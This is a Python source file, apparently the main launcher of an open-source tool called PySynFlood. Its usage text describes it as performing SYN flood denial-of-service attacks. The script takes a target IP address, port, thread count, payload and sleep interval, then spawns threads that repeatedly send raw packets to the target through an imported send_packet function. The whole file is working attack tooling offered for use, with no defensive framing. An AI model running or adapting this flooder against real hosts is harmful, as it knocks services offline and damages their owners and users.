import dataclasses
import sys
from typing import List, Any
import threading
from raw_socket import send_packet
import time

# payload = "OWNED"
# dest_ip = 'xxx.xxx.xxx.xxx'	# or socket.gethostbyname('www.example.com')
# port = 80
# max_threads = 2

USAGE = """Usage: py-synflood <ip_address> <port_numer> <max_threads> <payload> <sleep_interval>
Performs SYN flood denial-of-service (DoS) attacks.

      --help                     display this help and exit
      --version                  output version information and exit

Report bugs to: leonardo.aa88@gmail.com
GitHub repository: https://github.com/araujo88/py-synflood"""

@dataclasses.dataclass
class Arguments:
    dest_ip: str
    port: int
    max_threads: int
    payload: str
    sleep_interval: int

def check_type(obj):
    for field in dataclasses.fields(obj):
        value = getattr(obj, field.name)
        if type(value) != field.type:
            print(
            f"Value: {value}, "
            f"Expected type {field.type} for {field.name}, "
            f"got {type(value)}"
            )
            print("Type error")
            raise SystemExit(USAGE)

def validate(args: List[str]):
    try:
        if len(args) > 1 and args[1].isdigit() and args[2].isdigit() and args[4].isdigit():
            args[1] = int(args[1])
            args[2] = int(args[2])
            args[4] = int(args[4])
        arguments = Arguments(*args)
    except TypeError:
        raise SystemExit(USAGE)
    except IndexError:
        raise SystemExit(USAGE)
    check_type(arguments)

def main() -> None:
    args = sys.argv[1:]
    if not args:
        raise SystemExit(USAGE)

    if args[0] == "--help":
        raise SystemExit(USAGE)
    elif args[0] == "--version":
        print("PySynFlood 1.0.0")
        print("License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.")
        print("This is free software: you are free to change and redistribute it.")
        print("There is NO WARRANTY, to the extent permitted by law.")
        print("\nWritten by Leonardo Araujo.")
        raise SystemExit()
    else:
        validate(args)

    dest_ip = args[0]
    port = int(args[1])
    max_threads = int(args[2])
    payload = args[3]
    sleep_interval = int(args[4])

    print(f"Destination IP: {dest_ip}")
    print(f"Destination port: {port}")
    print(f"Number of threads: {max_threads}")
    print(f"Payload: {payload}")
    print(f"Sleep interval: {sleep_interval}")
    time.sleep(1)
    
    threads = []

    for i in range(0, max_threads):
        t = threading.Thread(target=send_packet, args=(dest_ip, port, payload, sleep_interval))
        t.start()
        threads.append(t)
		
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()